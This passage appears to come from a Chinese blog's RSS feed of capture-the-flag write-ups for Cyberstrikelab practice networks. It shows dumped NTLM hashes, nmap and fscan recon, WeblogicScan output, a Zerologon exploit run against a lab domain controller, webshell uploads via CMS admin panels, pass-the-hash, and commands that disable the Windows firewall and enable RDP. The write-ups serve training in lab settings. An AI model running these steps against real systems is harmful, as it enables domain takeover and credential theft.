Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
apache:1002:aad3b435b51404eeaad3b435b51404ee:0047605c0f2b9342a96ff4502f0f1a84:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:809f928153e9cdf27a043a18028a6efd:::
web:1001:aad3b435b51404eeaad3b435b51404ee:081dece85a94bf4a198aa49d8042347e:::
```

迁移到 `MSF`

![image.png](/post-images/CyberstrikelabLab4/image8.png)

查看网段信息

```php
Interface 16
============
Name         : Realtek RTL8139C+ Fast Ethernet NIC #3
Hardware MAC : b0:5e:4f:ef:a4:d3
MTU          : 1500
IPv4 Address : 192.168.20.10
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::c8c0:3fc0:ab95:1f0a
IPv6 Netmask : ffff:ffff:ffff:ffff::

Interface 17
============
Name         : Realtek RTL8139C+ Fast Ethernet NIC #2
Hardware MAC : 10:98:36:73:90:72
MTU          : 1500
IPv4 Address : 192.168.10.10
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::a898:1c84:d7f:2d59
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

上传 `Fscan`扫描

```php
C:\>fscan.exe -h 192.168.20.1-255 -nobr
fscan.exe -h 192.168.20.1-255 -nobr
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| __/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-08-14 03:25:46] [INFO] 暴力破解线程数: 1
[2025-08-14 03:25:46] [INFO] 开始信息扫描
[2025-08-14 03:25:46] [INFO] 生成IP范围: 192.168.20.1 - 192.168.20.255
[2025-08-14 03:25:46] [INFO] 最终有效主机数量: 255
[2025-08-14 03:25:46] [INFO] 开始主机扫描
[2025-08-14 03:25:46] [SUCCESS] 目标 192.168.20.10   存活 (ICMP)
[2025-08-14 03:25:46] [SUCCESS] 目标 192.168.20.30   存活 (ICMP)
[2025-08-14 03:25:46] [SUCCESS] 目标 192.168.20.20   存活 (ICMP)
[2025-08-14 03:25:49] [INFO] 存活主机数量: 3
[2025-08-14 03:25:49] [INFO] 有效端口数量: 233
[2025-08-14 03:25:49] [SUCCESS] 端口开放 192.168.20.30:88
[2025-08-14 03:25:49] [SUCCESS] 端口开放 192.168.20.20:135
[2025-08-14 03:25:49] [SUCCESS] 端口开放 192.168.20.30:135
[2025-08-14 03:25:49] [SUCCESS] 端口开放 192.168.20.10:135
[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.30:139
[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.10:445
[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.20:445
[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.20:139
[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.30:445
[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.30:389
[2025-08-14 03:25:51] [SUCCESS] 端口开放 192.168.20.10:139
[2025-08-14 03:25:53] [SUCCESS] 端口开放 192.168.20.10:3306
[2025-08-14 03:25:54] [SUCCESS] 服务识别 192.168.20.30:88 =>
[2025-08-14 03:25:55] [SUCCESS] 端口开放 192.168.20.20:7001
[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.30:139 =>  Banner:[.]
[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.10:445 =>
[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.20:445 =>
[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.20:139 =>  Banner:[.]
[2025-08-14 03:25:56] [SUCCESS] 服务识别 192.168.20.30:445 =>
[2025-08-14 03:25:57] [SUCCESS] 服务识别 192.168.20.10:139 =>  Banner:[.]
[2025-08-14 03:25:57] [SUCCESS] 端口开放 192.168.20.10:7680
[2025-08-14 03:26:02] [SUCCESS] 服务识别 192.168.20.30:389 =>
[2025-08-14 03:26:05] [SUCCESS] 服务识别 192.168.20.20:7001 => [http] 产品:Oracle WebLogic admin httpd
[2025-08-14 03:26:10] [SUCCESS] 服务识别 192.168.20.10:3306 =>  Banner:[H.j Host 'DESKTOP-JFB57A8' is not allowed to connect to this MySQL server]
[2025-08-14 03:26:52] [SUCCESS] 服务识别 192.168.20.10:7680 =>
[2025-08-14 03:26:54] [SUCCESS] 服务识别 192.168.20.20:135 =>
[2025-08-14 03:26:54] [SUCCESS] 服务识别 192.168.20.30:135 =>
[2025-08-14 03:26:54] [SUCCESS] 服务识别 192.168.20.10:135 =>
[2025-08-14 03:26:55] [INFO] 存活端口数量: 14
[2025-08-14 03:26:55] [INFO] 开始漏洞扫描
[2025-08-14 03:26:55] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle
[2025-08-14 03:26:55] [SUCCESS] NetInfo 扫描结果
目标主机: 192.168.20.10
主机名: DESKTOP-JFB57A8
发现的网络接口:
   IPv4地址:
      └─ 192.168.10.10
[2025-08-14 03:26:55] [SUCCESS] NetInfo 扫描结果
目标主机: 192.168.20.20
主机名: cyberweb
发现的网络接口:
   IPv4地址:
      └─ 192.168.20.20
[2025-08-14 03:26:55] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[2025-08-14 03:26:58] [SUCCESS] 网站标题 http://192.168.20.20:7001 状态码:404 长度:1164   标题:Error 404--Not Found
[2025-08-14 03:26:58] [SUCCESS] 发现指纹 目标: http://192.168.20.20:7001 指纹: [weblogic]
```

## 192.168.20.20 - 1

### Weblogic

扫描出来 `Weblogic`

用工具扫描一下

```php
➜  WeblogicScan git:(master) ✗ proxychains -q python WeblogicScan.py -u 192.168.20.20 -p 7001
/root/Desktop/Tools/WeblogicScan/WeblogicScan.py:6: SyntaxWarning: invalid escape sequence '\ '
  |  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __

__        __   _     _             _        ____                  
\ \      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __  
 \ \ /\ / / _ \ '_ \| |/ _ \ / _` | |/ __| \___ \ / __/ _` | '_ \ 
  \ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |
   \_/\_/ \___|_.__/|_|\___/ \__, |_|\___| |____/ \___\__,_|_| |_|
                             |___/ 
                             By Tide_RabbitMask | V 1.5 

Welcome To WeblogicScan !!!
Whoami：https://github.com/rabbitmask
[*] =========Task Start=========
[+] [192.168.20.20:7001] Weblogic Version Is 12.2.1.4.0
[+] [192.168.20.20:7001] Weblogic console address is exposed! The path is: http://192.168.20.20:7001/console/login/LoginForm.jsp
[-] [192.168.20.20:7001] Weblogic UDDI module default path does not exist!
[-] [192.168.20.20:7001] weblogic not detected CVE-2016-0638
[-] [192.168.20.20:7001] weblogic not detected CVE-2016-3510
[-] [192.168.20.20:7001] weblogic not detected CVE-2017-10271
[-] [192.168.20.20:7001] weblogic not detected CVE-2017-3248
[-] [192.168.20.20:7001] weblogic not detected CVE-2017-3506
[-] [192.168.20.20:7001] weblogic not detected CVE-2018-2628
[-] [192.168.20.20:7001] weblogic not detected CVE-2018-2893
[+] [192.168.20.20:7001] weblogic has a JAVA deserialization vulnerability:CVE-2018-2894
[-] [192.168.20.20:7001] weblogic not detected CVE-2019-2725
[-] [192.168.20.20:7001] weblogic not detected CVE-2019-2890
[*] =========Task E n d=========
```

没有账户，没法打

![image.png](/post-images/CyberstrikelabLab4/image9.png)

## 192.168.20.30

### 信息收集

这里先打 `192.168.20.30`

从上面扫描中能知道，这是 `DC` 

先尝试枚举一波

```php
➜  Tools proxychains nxc smb 192.168.20.30 -u anonymous -p ''
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK
SMB         192.168.20.30   445    WIN-7NRTJO59O7N  [*] Windows 6.1 Build 7600 x64 (name:WIN-7NRTJO59O7N) (domain:cyberstrikelab.com) (signing:True) (SMBv1:False) 
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:445  ...  OK
SMB         192.168.20.30   445    WIN-7NRTJO59O7N  [-] cyberstrikelab.com\anonymous: STATUS_LOGON_FAILURE 
```

![image.png](/post-images/CyberstrikelabLab4/image10.png)

并没有枚举出来什么

### Zerologon

这里再试试 `zerologon`

```php
➜  CVE-2020-1472-tester git:(master) proxychains -q python zerologon_tester.py WIN-7NRTJO59O7N 192.168.20.30
Performing authentication attempts...
================================================================
Success! DC can be fully compromised by a Zerologon attack.
```

还真有，打 `exp`

```php
➜  CVE-2020-1472-master proxychains -q python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30
Performing authentication attempts...
==================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

Dumphash

![image.png](/post-images/CyberstrikelabLab4/image11.png)

`PTH` 拿 `flag3`

![image.png](/post-images/CyberstrikelabLab4/image12.png)

## 192.168.20.20 - 2

从扫描结果看，`192.168.20.20`也是域内主机，也是直接 `PTH`

![image.png](/post-images/CyberstrikelabLab4/image13.png)

读 flag2

```php
C:\Windows\system32> type C:\flag.txt
go-flag{yJzuQ09FXn0h7Em4}
```]]></content:encoded>
            <category>靶机</category>
            <category>Cyberstrikelab</category>
            <category>Windows</category>
            <category>blueCMS</category>
            <category>多层内网</category>
            <category>zerologon</category>
        </item>
        <item>
            <title><![CDATA[Cyberstrikelab - Lab3]]></title>
            <link>https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab3</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab3</guid>
            <pubDate>Tue, 12 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Lab3 https://www.cyberstrikelab.com/#/scene/detail/22 Recon 提示 192.168.10.0 网段 扫描出来 192.168.10.10 HTTP 端口在3590 192.168.10.10 taoCMS 访问 Web 站点 寻找公开漏洞 h...]]></description>
            <content:encoded><![CDATA[
# Lab3

> https://www.cyberstrikelab.com/#/scene/detail/22
> 

## Recon

提示 `192.168.10.0` 网段

```php
➜  Lab3 nmap -sn 192.168.10.0/24                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:42 CST
Nmap scan report for 192.168.10.10
Host is up (0.053s latency).
Nmap scan report for 192.168.10.233
Host is up (0.075s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 18.25 seconds
```

扫描出来 `192.168.10.10`

```php
➜  Lab3 nmap -sT -min-rate 5000 -p- 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:43 CST
Nmap scan report for 192.168.10.10
Host is up (0.050s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3590/tcp  open  wv-csp-sms
5040/tcp  open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds
```

`HTTP` 端口在`3590`

```php
➜  Lab3 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 21:44 CST
Nmap scan report for 192.168.10.10
Host is up (0.054s latency).
                                                
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                             
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MySQL (unauthorized)
3590/tcp  open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
|_http-title:  taoCMS\xE6\xBC\x94\xE7\xA4\xBA
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 10 21H2 (92%), M
icrosoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 10 1903 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%
)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -8h00m00s                                                                         
| smb2-security-mode:                                                                           
|   3:1:1:                                                                                      
|_    Message signing enabled but not required                                                  
| smb2-time:                                                                                    
|   date: 2025-08-12T05:47:37                                                                   
|_  start_date: N/A                                                                             
                                                                                                                                                                                                
TRACEROUTE (using proto 1/icmp)                                                                                                                                                                 
HOP RTT      ADDRESS                                                                                                                                                                            
1   50.73 ms 172.16.233.1
2   50.81 ms 192.168.10.10                                                                      
                                                
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.96 seconds
```

## 192.168.10.10

### taoCMS

访问 `Web` 站点

![image.png](/post-images/CyberstrikelabLab3/image.png)

寻找公开漏洞

> https://blog.csdn.net/2302_82189125/article/details/140086872
> 

使用默认账号密码成功进去了

![image.png](/post-images/CyberstrikelabLab3/image1.png)

来到文件管理页面，新建文件

![image.png](/post-images/CyberstrikelabLab3/image2.png)

点击编辑写马子进去就行了

![image.png](/post-images/CyberstrikelabLab3/image3.png)

`system` 权限

![image.png](/post-images/CyberstrikelabLab3/image4.png)

直接上 `Vshell` ，首先关闭防火墙和开启远程桌面

![image.png](/post-images/CyberstrikelabLab3/image5.png)

通过一键上线命令

![image.png](/post-images/CyberstrikelabLab3/image6.png)

### 信息收集

读取 `flag1`

```php
C:\phpstudy_pro\WWW>type C:\flag.txt
go-flag{IpbKNIOigmnsuwY3}
```

查看网段信息

```php
C:\phpstudy_pro\WWW>ipconfig

Windows IP 配置

以太网适配器 以太网实例 0:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::81e3:1433:2412:22d8%17
   IPv4 地址 . . . . . . . . . . . . : 192.168.10.10
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.10.233

以太网适配器 以太网实例 0 2:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::edc1:3601:4f28:7fc4%11
   IPv4 地址 . . . . . . . . . . . . : 192.168.20.10
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.20.1
```

存在 `192.168.20.0` 网段，加上 `flag` 的提示

![image.png](/post-images/CyberstrikelabLab3/image7.png)

上传 `fscan` 扫描，先打 `192.168.20.20`

## 192.168.20.20

### 信息收集

`fscan` 扫描，`8055` 是 `web` 服务

```php
C:\>fscan -h 192.168.20.20 -nobr -p 1-65535
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-08-12 14:31:40] [INFO] 暴力破解线程数: 1
[2025-08-12 14:31:40] [INFO] 开始信息扫描
[2025-08-12 14:31:40] [INFO] 最终有效主机数量: 1
[2025-08-12 14:31:40] [INFO] 开始主机扫描
[2025-08-12 14:31:40] [INFO] 有效端口数量: 65535
[2025-08-12 14:31:45] [SUCCESS] 端口开放 192.168.20.20:135
[2025-08-12 14:31:45] [SUCCESS] 端口开放 192.168.20.20:139
[2025-08-12 14:31:50] [SUCCESS] 服务识别 192.168.20.20:139 =>  Banner:[.]
[2025-08-12 14:31:57] [SUCCESS] 端口开放 192.168.20.20:445
[2025-08-12 14:32:02] [SUCCESS] 服务识别 192.168.20.20:445 => 
[2025-08-12 14:32:50] [SUCCESS] 服务识别 192.168.20.20:135 => 
[2025-08-12 14:33:43] [SUCCESS] 端口开放 192.168.20.20:3306
[2025-08-12 14:33:43] [SUCCESS] 服务识别 192.168.20.20:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[H.j Host 'DESKTOP-JFB57A8' is not allowed
to connect to this MySQL server]
[2025-08-12 14:35:13] [SUCCESS] 端口开放 192.168.20.20:5985
[2025-08-12 14:35:19] [SUCCESS] 服务识别 192.168.20.20:5985 => [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows
[2025-08-12 14:36:24] [SUCCESS] 端口开放 192.168.20.20:8055
[2025-08-12 14:36:35] [SUCCESS] 服务识别 192.168.20.20:8055 => [http]
```

通过 `Vshell` 设置 `socks` 代理，然后给 `yakit` 设置下游代理即可访问

![image.png](/post-images/CyberstrikelabLab3/image8.png)

是 `thinkphp`，提示说被渗透过了

这里扫描了一波没扫描出来，可能网站被挂马了，爆破一下

这里尝试了使用 `ffuf` 和 `wfuzz` 来进行爆破，但是并不理想

### **awBruter**

看了一下 `WP` ，是通过 `awBruter` 来爆破，爆破得到密码 `admin123`

![image.png](/post-images/CyberstrikelabLab3/image9.png)

蚁剑连接

![image.png](/post-images/CyberstrikelabLab3/image10.png)

被挂马的地方：

![image.png](/post-images/CyberstrikelabLab3/image11.png)

查看权限

![image.png](/post-images/CyberstrikelabLab3/image12.png)

读取 `flag2`

```php
C:\> type flag.txt
go-flag{C2AoW93mioh5XYQg}
```

上线有点麻烦就算了，通过 `stowaway` 或者 `chisel` 弄一个端口映射就行

## 192.168.20.30

### 信息收集

通过 `192.168.20.20` 能知道 `192.168.20.30` 就是 `DC`

![image.png](/post-images/CyberstrikelabLab3/image13.png)

`fscan` 扫描

```php
C:\>fscan.exe -h 192.168.20.30 -nobr
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-08-12 15:21:41] [INFO] 暴力破解线程数: 1
[2025-08-12 15:21:41] [INFO] 开始信息扫描
[2025-08-12 15:21:41] [INFO] 最终有效主机数量: 1
[2025-08-12 15:21:42] [INFO] 开始主机扫描
[2025-08-12 15:21:42] [INFO] 有效端口数量: 233
[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:445
[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:389
[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:139
[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:135
[2025-08-12 15:21:42] [SUCCESS] 端口开放 192.168.20.30:88
[2025-08-12 15:21:47] [SUCCESS] 服务识别 192.168.20.30:445 => 
[2025-08-12 15:21:47] [SUCCESS] 服务识别 192.168.20.30:139 =>  Banner:[.]
[2025-08-12 15:21:47] [SUCCESS] 服务识别 192.168.20.30:88 => 
[2025-08-12 15:21:52] [SUCCESS] 服务识别 192.168.20.30:389 => 
[2025-08-12 15:22:47] [SUCCESS] 服务识别 192.168.20.30:135 => 
[2025-08-12 15:22:47] [INFO] 存活端口数量: 5
[2025-08-12 15:22:47] [INFO] 开始漏洞扫描
[2025-08-12 15:22:47] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle
[2025-08-12 15:22:47] [SUCCESS] NetInfo 扫描结果
目标主机: 192.168.20.30
主机名: WIN-7NRTJO59O7N
发现的网络接口:
   IPv4地址:
      └─ 192.168.20.30
[2025-08-12 15:22:48] [SUCCESS] 扫描已完成: 9/9
```

尝试 `SMB` 匿名

```php
➜  fscan proxychains -q nxc smb 192.168.20.30 -u anonymous -p ''
SMB         192.168.20.30   445    WIN-7NRTJO59O7N  [*] Windows 6.1 Build 7600 x64 (name:WIN-7NRTJO59O7N) (domain:cyberstrikelab.com) (signing:True) (SMBv1:False) 
SMB         192.168.20.30   445    WIN-7NRTJO59O7N  [-] cyberstrikelab.com\anonymous: STATUS_LOGON_FAILURE
```

没什么发现的，尝试一下公开漏洞，测试一下 `zerologon`

### zerologon

> POC：https://github.com/SecuraBV/CVE-2020-1472
> 

```php
➜  CVE-2020-1472 git:(master) proxychains -q python zerologon_tester.py WIN-7NRTJO59O7N 192.168.20.30
Performing authentication attempts...
==============================================================================
Success! DC can be fully compromised by a Zerologon attack
```

再利用 exp

> https://github.com/dirkjanm/CVE-2020-1472
> 

```php
➜  CVE-2020-1472-master proxychains -q python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30
Performing authentication attempts...
=====================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

然后直接 `Dumphash`

![image.png](/post-images/CyberstrikelabLab3/image14.png)

`PTH`

![image.png](/post-images/CyberstrikelabLab3/image15.png)

读取 flag

```php
C:\Windows\system32> type C:\flag.txt
go-flag{ueoJt7eB6AQL8OpL}
```]]></content:encoded>
            <category>靶机</category>
            <category>Cyberstrikelab</category>
            <category>Windows</category>
            <category>taoCMS</category>
            <category>多层内网</category>
            <category>zerologon</category>
        </item>
        <item>
            <title><![CDATA[Cyberstrikelab - Lab2]]></title>
            <link>https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab2</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab2</guid>
            <pubDate>Tue, 12 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Lab2 https://www.cyberstrikelab.com/#/scene/detail/21 192.168.10.10 Recon 端口扫描 808 是 web 服务 骑士 CMS 访问 808 端口 在页尾中能找到 Powered by 74cms v4.2.111 通过搜寻，存在...]]></description>
            <content:encoded><![CDATA[
# Lab2

> https://www.cyberstrikelab.com/#/scene/detail/21
> 

## 192.168.10.10

### Recon

端口扫描

```php
➜  Lab2 nmap -sT -min-rate 5000 -p- 192.168.10.10                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:36 CST
Nmap scan report for 192.168.10.10
Host is up (0.053s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
808/tcp   open  ccproxy-http
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

`808` 是 `web` 服务

```php
➜  Lab2 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:37 CST
Stats: 0:02:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.86% done; ETC: 18:40 (0:00:10 remaining)
Nmap scan report for 192.168.10.10
Host is up (0.054s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
808/tcp   open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
|_http-title: \xE9\xAA\x91\xE5\xA3\xABPHP\xE9\xAB\x98\xE7\xAB\xAF\xE4\xBA\xBA\xE6\x89\x8D\xE7\xB3\xBB\xE7\xBB\x9F(www.74cms.com)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
3306/tcp  open  mysql         MySQL (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 21H1 (92%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H2 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-08-12T02:40:41
|_  start_date: N/A
|_clock-skew: -8h00m00s

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   53.19 ms 172.16.233.1
2   53.32 ms 192.168.10.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.60 seconds
```

### 骑士 CMS

访问 `808` 端口

![image.png](/post-images/CyberstrikelabLab2/image.png)

在页尾中能找到 `Powered by 74cms v4.2.111` 

通过搜寻，存在后台 `getshell` 

先测试是否存在弱密码，后台页面：`http://192.168.10.10:808/index.php?m=admin&c=index&a=login`

通过弱密码 `admin`:`admin123456` 进入后台

![image.png](/post-images/CyberstrikelabLab2/image1.png)

> 利用链接：https://blog.csdn.net/m0_63253040/article/details/127041028
> 

![image.png](/post-images/CyberstrikelabLab2/image2.png)

然后访问 `/Application/Home/Conf/config.php`

![image.png](/post-images/CyberstrikelabLab2/image3.png)

反弹 `shell`

![image.png](/post-images/CyberstrikelabLab2/image4.png)

![image.png](/post-images/CyberstrikelabLab2/image5.png)

上线 `Vshell` 

首先将防火墙和远程桌面打开

```php
PS C:\phpstudy_pro\WWW\Application\Home\Conf> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
The operation completed successfully.

PS C:\phpstudy_pro\WWW\Application\Home\Conf> netsh advfirewall set allprofiles state off
Ok.
```

通过一键上线命令上线，传`payload` 也可以

![image.png](/post-images/CyberstrikelabLab2/image6.png)

### 信息收集

读取第一个 `flag.txt`

```php
C:\>type flag.txt
go-flag{MP9E4xXhya0TlzVF}
```

`IP` 信息，很奇怪，为什么只有一个网络

```php
C:\>ipconfig

Windows IP 配置

以太网适配器 以太网实例 0:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::81d8:7722:88a0:5578%12
   IPv4 地址 . . . . . . . . . . . . : 192.168.10.10
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.10.233
```

我么对网段段进行扫描，存在三台机子

```php
➜  Lab2 nmap -sn 192.168.10.0/24                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 19:01 CST
Nmap scan report for 192.168.10.10
Host is up (0.056s latency).
Nmap scan report for 192.168.10.20
Host is up (0.058s latency).
Nmap scan report for 192.168.10.233
Host is up (0.061s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.37 seconds
```

`Fscan` 扫描一下

```php
➜  fscan ./fscan_1.8.4 -h 192.168.10.1-255

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 192.168.10.10   is alive
(icmp) Target 192.168.10.20   is alive
(icmp) Target 192.168.10.233  is alive
[*] Icmp alive hosts len is: 3
192.168.10.10:139 open
192.168.10.20:135 open
192.168.10.10:3306 open
192.168.10.10:135 open
192.168.10.233:22 open
192.168.10.20:445 open
192.168.10.20:139 open
192.168.10.10:445 open
192.168.10.20:8080 open
